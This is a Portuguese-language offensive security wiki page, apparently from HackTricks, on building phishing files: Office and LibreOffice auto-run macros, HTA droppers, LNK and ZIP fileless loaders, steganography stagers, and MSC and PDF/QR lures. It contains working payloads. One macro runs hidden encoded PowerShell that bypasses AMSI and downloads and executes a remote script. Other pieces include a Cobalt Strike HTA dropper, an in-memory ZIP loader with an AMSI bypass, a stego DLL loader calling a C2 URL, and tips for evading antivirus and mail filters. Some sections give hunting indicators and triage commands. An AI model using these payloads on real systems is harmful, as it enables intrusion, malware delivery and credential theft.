# Arquivos e documentos de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos do Office

O Microsoft Word valida os dados do arquivo antes de abri-lo. Essa validação é realizada por meio da identificação da estrutura dos dados, de acordo com o padrão OfficeOpenXML. Se ocorrer algum erro durante a identificação da estrutura dos dados, o arquivo analisado não será aberto.

Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando sua extensão e ainda manter a capacidade de executar macros.\
Por exemplo, um arquivo RTF não oferece suporte a macros por definição, mas um arquivo DOCM renomeado para RTF será processado pelo Microsoft Word e poderá executar macros.\
Os mesmos mecanismos internos se aplicam a todos os softwares do Microsoft Office Suite (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:

```bash
assoc | findstr /i "word excel powerp"
```

Arquivos DOCX que fazem referência a um template remoto (File –Options –Add-ins –Manage: Templates –Go) que inclui macros também podem “executar” macros.

### Carregamento de imagem externa

Acesse: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, e **Filename or URL**:_ http://<ip>/whatever

![Documentos do Office - Carregamento de imagem externa: Acesse: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Para analisar um documento recebido, em vez de criar um, consulte [Análise de macros VBA: código inútil e UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Backdoor de macros

É possível usar macros para executar código arbitrário a partir do documento.

#### Funções de carregamento automático

Quanto mais comuns forem, maior a probabilidade de o AV detectá-las.

- AutoOpen()
- Document_Open()

#### Exemplos de código de macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Remover metadados manualmente

Vá para **Arquivo > Informações > Inspecionar Documento > Inspecionar Documento**, que abrirá o Inspetor de Documentos. Clique em **Inspecionar** e depois em **Remover Tudo** ao lado de **Propriedades do Documento e Informações Pessoais**.

#### Extensão do Doc

Quando terminar, selecione o menu suspenso **Salvar como tipo** e altere o formato de **`.docx`** para Word 97-2003 **`.doc`**.\
Faça isso porque **não é possível salvar macros dentro de um `.docx`** e há um **estigma** **em torno** da extensão **`.docm`** habilitada para macros (por exemplo, o ícone da miniatura tem um `!` enorme e alguns gateways da web/e-mail os bloqueiam completamente). Portanto, a extensão legada **`.doc` é o melhor compromisso**.

#### Geradores de Macros Maliciosas

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros de execução automática do LibreOffice ODT (Basic)

Documentos do LibreOffice Writer podem incorporar macros Basic e executá-las automaticamente quando o arquivo é aberto, vinculando a macro ao evento **Abrir Documento** (Ferramentas → Personalizar → Eventos → Abrir Documento → Macro…).<sup>[[1]](#references)</sup> Uma macro simples de reverse shell é assim:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Observe as aspas duplicadas (`""`) dentro da string: o LibreOffice Basic usa-as para escapar aspas literais, portanto payloads que terminam em `...==""")` mantêm equilibrados tanto o comando interno quanto o argumento de Shell.

Dicas de entrega:

- Salve como `.odt` e associe a macro ao evento do documento para que seja executada imediatamente ao abri-lo.
- Ao enviar um e-mail com `swaks`, use `--attach @resume.odt` (o `@` é necessário para que os bytes do arquivo, e não a string do nome do arquivo, sejam enviados como anexo). Isso é fundamental ao abusar de servidores SMTP que aceitam destinatários arbitrários em `RCPT TO` sem validação.

## Arquivos HTA

Um HTA é um programa do Windows que **combina HTML e linguagens de script (como VBScript e JScript)**. Ele gera a interface do usuário e é executado como um aplicativo "totalmente confiável", sem as restrições do modelo de segurança de um navegador.

Um HTA é executado usando **`mshta.exe`**, que geralmente é **instalado** junto com o **Internet Explorer**, tornando o **`mshta` dependente do IE**. Portanto, se ele tiver sido desinstalado, os HTAs não poderão ser executados.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Cartões falsos de anexos em e-mails HTML

Um e-mail HTML pode imitar o cartão nativo de pré-visualização de anexos de um provedor sem incluir um anexo real. A Talos observou um cartão do Gmail reconstruído a partir de quatro partes MIME PNG inline codificadas em Base64. Todo o elemento visual estava envolvido por uma única âncora, e um valor de destinatário em `?m=<target-id>` permitia o rastreamento por destinatário. O link começava com `//` em vez de `http://` ou `https://`; os navegadores resolvem esse formato relativo ao protocolo, mas extratores de URLs que correspondem apenas a URLs totalmente qualificadas podem não detectá-lo.<sup>[[11]](#references)</sup>

Durante a análise, inspecione o MIME bruto em vez de confiar na lista de anexos renderizada. Reconstrua como as partes de imagem inline formam o cartão visual, identifique a âncora que o envolve e normalize os valores `href` relativos ao protocolo antes de extrair URLs.<sup>[[11]](#references)</sup>

Para testes de falsificação do remetente do envelope/cabeçalho e de alinhamento DMARC, consulte [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Forçar autenticação NTLM

Há várias maneiras de **forçar a autenticação NTLM "remotamente"**. Por exemplo, você pode adicionar **imagens invisíveis** a e-mails ou a HTML que o usuário acessará (até mesmo por HTTP MitM?). Ou enviar à vítima o **endereço de arquivos** que **acionarão** uma **autenticação** apenas ao **abrir a pasta**.

**Confira estas ideias e outras nas páginas a seguir:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Não se esqueça de que você não pode apenas roubar o hash ou a autenticação, mas também **realizar ataques NTLM relay**:

- [**Ataques NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay para certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Atalho LNK para preparar comandos locais com `ftp.exe`

Um atalho pode iniciar `ftp.exe -s:icon.ico` usando um arquivo de comandos de texto disfarçado com uma extensão de imagem.<sup>[[12]](#references)</sup> A opção `-s:` lê comandos FTP locais; no Windows 8 e versões posteriores, esse arquivo precisa estar codificado em UTF-8.<sup>[[13]](#references)</sup> Uma linha que começa com `!` executa um comando local por meio de `cmd /c`, sem enviar esse comando a um servidor FTP. Não é necessária uma conexão FTP para esse caminho de execução local.<sup>[[14]](#references)</sup> Na cadeia relatada, o script FTP chegava a um segundo arquivo de comandos. A linha `!` completa é importante: `!more res.ico` sozinho exibe o arquivo, enquanto um pipe para `cmd` executa seu conteúdo.<sup>[[12]](#references)[[14]](#references)</sup>

A mesma cadeia usava uma tarefa recorrente para reler um arquivo de comandos gravável, em vez de instalar um novo executável a cada atualização. A ação da tarefa era `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; o arquivo continha um comando que buscava instruções ao ser executado. Uma variante relacionada baixava um arquivo de comandos substituto antes de uma execução agendada. O arquivo precisa estar presente e legível quando a tarefa for acionada; `conhost` não eleva a tarefa além do token de usuário configurado.<sup>[[12]](#references)</sup> Consulte [execução de tarefas agendadas](../../windows-hardening/lateral-movement/atexec.md) para conhecer a mecânica das tarefas.

## Atalho VHDX com MSI oculto e documento chamariz

Um VHDX montado pode exibir um LNK visível enquanto mantém um MSI e uma planilha chamariz ocultos no mesmo volume. Na cadeia relatada, o LNK usava `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. O separador `&` abre o chamariz mesmo que o comando do instalador falhe; a abertura do documento não comprova que a instalação foi bem-sucedida. Esta é uma variação de entrega da [execução de ações personalizadas de MSI](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), não uma escalada de privilégios por MSI por si só.<sup>[[12]](#references)</sup>

Neste MSI, `CustomAction.Type` **194** combina um EXE armazenado na tabela `Binary` (**2**) com os sinalizadores de ignorar código de retorno (**64**) e assíncrono (**128**). A combinação **64 + 128** significa que o Windows Installer não espera o EXE terminar; apenas o sinalizador 128 faria a espera ocorrer no fim da sequência.<sup>[[15]](#references)[[16]](#references)</sup> Verifique o `Source` da ação em relação à tabela `Binary` e sua posição em `InstallExecuteSequence` antes de atribuir a execução àquele EXE incorporado.<sup>[[12]](#references)[[15]](#references)</sup> Um [caminho UNC WebDAV pode entregar um MSI remoto](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), mas esse é um ponto de entrada diferente.

## Carregadores LNK + cargas úteis incorporadas em ZIP (cadeia fileless)

Campanhas altamente eficazes entregam um ZIP contendo dois documentos chamariz legítimos (PDF/DOCX) e um .lnk malicioso. O truque é que o carregador PowerShell real fica armazenado nos bytes brutos do ZIP, depois de um marcador exclusivo, e o .lnk o extrai e executa totalmente na memória.<sup>[[2]](#references)</sup>

Fluxo típico implementado pela linha única do PowerShell no .lnk:

1) Localiza o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e o diretório pai do diretório de trabalho atual.
2) Lê os bytes do ZIP e encontra um marcador fixo (por exemplo, xFIQCV). Tudo o que vem depois do marcador é a carga útil PowerShell incorporada.
3) Copia o ZIP para %ProgramData%, extrai seu conteúdo nesse local e abre o .docx chamariz para parecer legítimo.
4) Contorna o AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofusca o próximo estágio (por exemplo, remove todos os caracteres #) e o executa na memória.

Exemplo de estrutura PowerShell para extrair e executar o estágio incorporado:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notas
- A entrega costuma abusar de subdomínios PaaS de boa reputação (por exemplo, *.herokuapp.com) e pode restringir o acesso aos payloads (servir ZIPs benignos com base no IP/UA).
- A próxima etapa frequentemente descriptografa shellcode em base64/XOR e o executa por meio de Reflection.Emit + VirtualAlloc para minimizar artefatos em disco.

Persistência usada na mesma cadeia
- Sequestro de COM TypeLib do controle Microsoft Web Browser para que o IE/Explorer ou qualquer aplicativo que o incorpore reinicie automaticamente o payload.<sup>[[2]](#references)[[4]](#references)</sup> Veja detalhes e comandos prontos para uso aqui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Caça/IOCs
- Arquivos ZIP contendo a string marcadora ASCII (por exemplo, xFIQCV) anexada aos dados do arquivo.
- Arquivo .lnk que enumera pastas pai/do usuário para localizar o ZIP e abre um documento-isca.
- Adulteração do AMSI por meio de [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads de e-mail comerciais de longa duração que terminam com links hospedados em domínios PaaS confiáveis.

## Preparação iniciada por arquivo .lnk com isca → persistência por tarefa agendada → side-loading de CPL confiável

Outro padrão recorrente é um **`.lnk` que se faz passar por documento** e abre imediatamente uma isca benigna enquanto prepara a cadeia real em segundo plano.<sup>[[3]](#references)</sup>

Fluxo de trabalho observado:
1. O atalho **se disfarça de PDF** e usa `conhost.exe` ou um proxy semelhante para iniciar um downloader de PowerShell ofuscado.
2. O PowerShell fragmenta tokens óbvios (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) para que detecções ingênuas que procuram `iwr`, `gci`, `ren`, `cpi` ou `schtasks` não identifiquem o comando.
3. O stager baixa primeiro o **documento-isca**, abre-o para a vítima e, em seguida, reconstrói os arquivos maliciosos em segundo plano.
4. Os payloads podem ser gravados com **extensões falsas** e depois renomeados, removendo caracteres de preenchimento, para atrasar o aparecimento de artefatos óbvios `.exe` / `.cpl`.
5. A persistência é estabelecida com uma **tarefa agendada baseada em minutos** que inicia um binário host confiável a partir de um caminho gravável pelo usuário.

Pistas mínimas para caça a partir desse padrão:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Um layout de staging útil para reconhecer é:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por que o segundo estágio é furtivo

No estudo de caso da Rapid7, a tarefa agendada iniciava repetidamente **`Fondue.exe`** a partir de `C:\Users\Public\`. Como **`APPWIZ.cpl`** estava no mesmo diretório e exportava **`RunFODW`**, o binário confiável da Microsoft fazia side-loading do CPL do atacante em vez de usar a cópia legítima do sistema.

O CPL então:
- Lê um blob **AES-256-CBC** de `C:\Windows\Tasks\editor.dat`
- Descriptografa-o por meio de **Windows CNG / `bcrypt.dll`**
- Aloca memória executável e copia o shellcode descriptografado
- Executa-o indiretamente passando o ponteiro para o shellcode como callback de **`EnumUILanguagesW`**

Vale a pena investigar essa última etapa separadamente: muitas vezes, o malware evita um salto direto `((void(*)())buf)()` e, em vez disso, abusa de uma **WinAPI legítima que recebe um callback** para transferir a execução.

O payload descriptografado nesta campanha era shellcode **Donut**, que então mapeava o PE final totalmente na memória e aplicava patches em **AMSI/WLDP/ETW** no processo atual antes de transferir a execução. Para mais detalhes sobre side-loading e pós-processamento residente na memória, consulte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pistas práticas para investigação:
- `.lnk` iniciando `powershell.exe` ou `conhost.exe`, seguido por um documento chamariz visível.
- Downloads de curta duração para **`C:\Users\Public\`**, seguidos por renomeações imediatas de extensões sem sentido.
- Tarefas agendadas com nomes genéricos, como `GoogleErrorReport`, executadas a partir de **diretórios graváveis pelo usuário**.
- Binários confiáveis carregando arquivos **`.cpl` / `.dll`** do mesmo diretório que não seja do sistema.
- Blobs de texto Base64 gravados em **`C:\Windows\Tasks\`** e, em seguida, lidos pelo módulo carregado por side-loading.

## Payloads delimitados por esteganografia em imagens (stager de PowerShell)

Cadeias de loaders recentes entregam um JavaScript/VBS ofuscado que decodifica e executa um stager de PowerShell em Base64. Esse stager baixa uma imagem (geralmente GIF) que contém uma DLL .NET codificada em Base64 e oculta como texto simples entre marcadores exclusivos de início/fim. O script procura esses delimitadores (exemplos encontrados em circulação: «<<sudo_png>> … <<sudo_odt>>>»), extrai o texto entre eles, decodifica o Base64 em bytes, carrega o assembly na memória e invoca um método de entrada conhecido com a URL do C2.<sup>[[5]](#references)</sup>

Fluxo de trabalho
- Estágio 1: Dropper JS/VBS arquivado → decodifica o Base64 incorporado → inicia o stager de PowerShell com -nop -w hidden -ep bypass.
- Estágio 2: Stager de PowerShell → baixa uma imagem, extrai o Base64 delimitado por marcadores, carrega a DLL .NET na memória e chama seu método (por exemplo, VAI), passando a URL do C2 e as opções.
- Estágio 3: O loader recupera o payload final e normalmente o injeta por meio de process hollowing em um binário confiável (comumente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Saiba mais sobre process hollowing e execução por proxy de utilitários confiáveis aqui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemplo de PowerShell para extrair uma DLL de uma imagem e invocar um método .NET na memória:

<details>
<summary>Extrator e loader de payload stego em PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Observações
- Este é o ATT&CK T1027.003 (esteganografia/ocultação de marcadores).<sup>[[6]](#references)</sup> Os marcadores variam entre campanhas.
- O bypass de AMSI/ETW e a desofuscação de strings são comumente aplicados antes de carregar o assembly.
- Caça a ameaças: verifique imagens baixadas em busca de delimitadores conhecidos; identifique o PowerShell acessando imagens e decodificando imediatamente blobs Base64.

Veja também ferramentas de esteganografia e técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppers JS/VBS → preparação de PowerShell via Base64

Uma etapa inicial recorrente é um arquivo `.js` ou `.vbs` pequeno e fortemente ofuscado, distribuído dentro de um arquivo compactado. Seu único propósito é decodificar uma string Base64 incorporada e iniciar o PowerShell com `-nop -w hidden -ep bypass` para preparar a próxima etapa via HTTPS.<sup>[[5]](#references)</sup>

Lógica básica (abstrata):
- Ler o conteúdo do próprio arquivo
- Localizar um blob Base64 entre strings lixo
- Decodificar para PowerShell em ASCII
- Executar com `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Indicadores para caça a ameaças
- Anexos JS/VBS arquivados iniciando `powershell.exe` com `-enc`/`FromBase64String` na linha de comando.
- `wscript.exe` iniciando `powershell.exe -nop -w hidden` a partir de caminhos temporários do usuário.

## Documentos MSC como contêineres de execução (GrimResource)

Arquivos do Microsoft Management Console (`.msc`) são definições de console XML normalmente abertas pelo `mmc.exe`. **GrimResource** arma uma referência `StringTable` a um recurso `apds.dll` que contém uma antiga primitiva XSS, fazendo com que a abertura do console criado para esse fim execute JavaScript dentro do `mmc.exe`. Amostras observadas combinaram ofuscação baseada em `transformNode` com **DotNetToJScript** para instanciar um payload .NET sem o caminho usual de macro do Office.<sup>[[9]](#references)</sup>

Para triagem estática, trate um MSC não confiável como texto e **não** clique duas vezes nele:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Pivôs de runtime com alto sinal incluem `mmc.exe` carregando o CLR ou componentes de script, criando conexões de rede ou iniciando `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ou um executável inesperado. O formato é legítimo, portanto as detecções devem correlacionar **origem + conteúdo suspeito de XML/script + comportamento de `mmc.exe`**, em vez de bloquear todo arquivo MSC.<sup>[[9]](#references)</sup>

## Redirecionadores de PDF/QR e controle de acesso ao payload

Um PDF não precisa de um exploit para ser útil. Campanhas recentes inserem um **código QR ou link comum** em um documento com aparência inofensiva, desviam a sessão do navegador dos controles de e-mail e personalizam o destino com o endereço do destinatário. A Microsoft documentou PDFs de 2025 cujas URLs de QR eram únicas para cada destinatário e levavam à infraestrutura de roubo de credenciais RaccoonO365; uma cadeia paralela usava filtragem por IP/ambiente para enviar um caminho JavaScript/MSI a visitantes selecionados, mas um PDF inofensivo a scanners ou clientes não autorizados.<sup>[[10]](#references)</sup>

Faça a triagem das ações do PDF e dos códigos QR renderizados. Um QR pode ser desenhado como vetor, em vez de estar armazenado como imagem extraível; por isso, rasterize todas as páginas e também extraia as imagens incorporadas:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspecione os destinos decodificados e os redirecionamentos em um sistema de análise isolado, sem autenticar. Recursos úteis para investigação incluem PDFs contendo apenas QR codes com corpos de e-mail quase vazios, o endereço de e-mail do destinatário incorporado em um parâmetro de consulta, vários redirecionamentos por serviços de hospedagem confiáveis e conteúdo diferente retornado conforme o IP, a geolocalização, os cookies, o referrer ou o user agent. Compare as solicitações usando perfis controlados, pois uma única consulta feita por um sandbox pode receber apenas o conteúdo-isca.<sup>[[10]](#references)</sup>

## Arquivos do Windows para roubar hashes NTLM

Consulte a página sobre **locais para roubar credenciais NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro do LibreOffice → webshell do IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campanha ZipLine: um ataque de phishing sofisticado que tem empresas dos EUA como alvo](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: rastreando as táticas de Dropping Elephant por uma cadeia de loaders com temática chinesa](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nova técnica de persistência COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – O loader PhantomVAI distribui diversos infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console para acesso inicial e evasão](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Atores de ameaças aproveitam a temporada de declaração de impostos para lançar campanhas de phishing com temática fiscal](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Cadeia de distribuição do UAT-11587 e backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER amplia seu arsenal com o PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - comando ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Opções de processamento de retorno de Custom Action](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
